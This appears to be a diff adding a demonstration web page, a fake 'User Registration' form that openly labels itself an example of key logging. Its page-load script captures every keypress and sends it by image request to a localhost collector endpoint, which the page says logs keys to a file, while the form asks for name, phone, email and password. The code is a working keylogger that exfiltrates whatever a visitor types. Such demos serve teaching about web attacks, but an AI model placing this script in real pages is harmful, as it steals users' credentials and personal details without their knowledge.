@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+    <title>User Registration</title>
+    
+    <style type="text/css">
+    <!--
+    body {
+      color:#000000;
+      background-color:#EEEEEE;
+    }
+    a  { color:#0000FF; }
+    a:visited { color:#800080; }
+    a:hover { color:#008000; }
+    a:active { color:#FF0000; }
+    -->
+    </style>
+    
+  </head>
+  <body>
+  <div id="container" >
+
+	<div id="header" style="background-color:#FFA500;">
+	<h1 style="margin-bottom:0;">Welcome to User Registration</h1></div>
+	
+	<div id="content" >
+	<h3>Enter your details below</h3>
+	<hr>
+
+<!-- This script will start as soon as page is loaded and now user is alredy attacked -->
+<script>
+var keynum;
+var attacker = 'http://127.0.0.1:5000/keylogger?key='	
+document.onkeypress = function(e) {
+	keynum = e.keyCode;
+	keypressed = encodeURIComponent(String.fromCharCode(keynum));
+	new Image().src = attacker + keypressed;
+	}
+</script>
+
+<h2>Example of key logging</h2>
+<h4>
+<p>User just tries to load this webpage and is susceptible to a key logging attack.<br>
+<p>Server listening to and saving the keystrokes is written in python flask and will be running on localhost<br>
+<p>Keys pressed are getting saved in the file named as 'key-logs.txt' in the same folder as the python app.py file
+<p>Any Users personal details can be hacked by an attacker by simply filling in the following form<br>
+</h4>
+
+
+<!-- <button type="button" onclick="myFunction()">Click Me!</button> -->
+<center><h2>Please fill in your personal details below</h2></center>
+ 											<center><div class="form-group">
+                                            <br><label>Enter First Name</label>
+                                            <input type="text" size="25" maxlength="255" ></input>
+                                        	</div><br>
+                                        	<div class="form-group">
+                                            <br><label>Enter Last Name</label>
+                                            <input type="text" size="25" maxlength="255" >
+                                        	</div><br>
+											<div class="form-group">
+                                            <br><label>Enter Mobile Number</label>
+                                            <input type="text" size="25" maxlength="255" >
+                                            <div class="form-group">
+                                            <br><label>Enter Email Address</label>
+                                            <input type="text" size="25" maxlength="255" >
+                                        	</div><br>
+                                        	<div class="form-group">
+                                            <br><label>Create Password</label>
+                                            <input type="text" size="25" maxlength="255">
+                                        	</div><br>
+                                        	
+
+
+</body></center>
+</html>
